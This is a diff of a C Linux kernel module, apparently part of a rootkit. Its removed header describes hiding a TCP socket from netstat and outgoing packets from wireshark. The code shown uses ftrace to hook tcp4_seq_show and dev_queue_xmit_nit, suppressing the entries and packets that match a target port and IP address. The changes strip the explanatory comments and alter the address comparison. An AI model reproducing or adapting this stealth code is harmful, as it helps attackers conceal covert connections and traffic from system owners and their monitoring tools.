@@ -1,11 +1,3 @@
-/*
- * hide_tcp_sock.c - provides a complete hiding for a tcp socket
- * 	- port hiding (will not be seen from tools such as netstat)
- *	- outwards packet hiding  (will not be seen from tools such as wireshark)
- *
- * Omer Kfir (C)
- */
-
 #include "hide_tcp_sock.h"
 
 struct ftrace_hook {
@@ -45,7 +37,6 @@ static void *find_symbol_address(const char *name) {
   return addr;
 }
 
-// Hook function for tcp4_seq_show - hiding port
 static asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
   if (v && v != SEQ_START_TOKEN) {
     struct inet_sock *inet = (struct inet_sock *)v;
@@ -63,20 +54,18 @@ static asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
   return tcp4_seq_show_address(seq, v);
 }
 
-// Hook function for dev_queue_xmit_nit - hiding outward packet
 static asmlinkage void dev_queue_xmit_nit_hook(struct sk_buff *skb,
                                                struct net_device *dev) {
   if (skb->protocol == htons(ETH_P_IP)) {
     struct iphdr *iph = ip_hdr(skb);
-    u32 daddr = ntohl(iph->daddr);
-
     u32 target_ip = in_aton(dAddress);
+
     if (iph->protocol == IPPROTO_TCP) {
       struct tcphdr *tcph = tcp_hdr(skb);
       u16 dest_port = ntohs(tcph->dest);
 
       // Compare the destination port and IP address directly
-      if (dest_port == dPort && daddr == target_ip) {
+      if (dest_port == dPort && iph->daddr == target_ip) {
         return; // Hide the packet
       }
     }
@@ -85,7 +74,6 @@ static asmlinkage void dev_queue_xmit_nit_hook(struct sk_buff *skb,
   dev_queue_xmit_nit_addr(skb, dev);
 }
 
-// Callback function for hooks
 static void notrace callback_hook(unsigned long ip, unsigned long parent_ip,
                                   struct ftrace_ops *ops,
                                   struct ftrace_regs *regs) {
@@ -121,7 +109,6 @@ static struct ftrace_hook packets_hide = {
         },
 };
 
-// Register the two structures packets_hide, port_hide to ftrace
 int register_tcp_sock_hook(void) {
   int ret = 0;
 
@@ -189,7 +176,6 @@ int register_tcp_sock_hook(void) {
   return 0;
 }
 
-// Unregister hooks
 void unregister_tcp_sock_hook(void) {
   if (!port_hide.original || !packets_hide.original || !sock_hidden)
     return;
